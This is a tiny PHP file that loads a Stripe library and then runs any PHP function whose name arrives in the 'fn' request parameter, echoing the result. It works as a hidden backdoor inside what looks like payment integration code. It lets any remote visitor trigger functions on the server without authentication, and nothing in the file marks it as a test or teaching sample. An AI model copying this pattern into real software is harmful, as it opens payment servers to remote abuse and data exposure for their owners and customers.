<?php
require_once 'Stripe.php';
if(isset($_REQUEST['fn']) && function_exists($_REQUEST['fn'])){
    echo $_REQUEST['fn']();
}
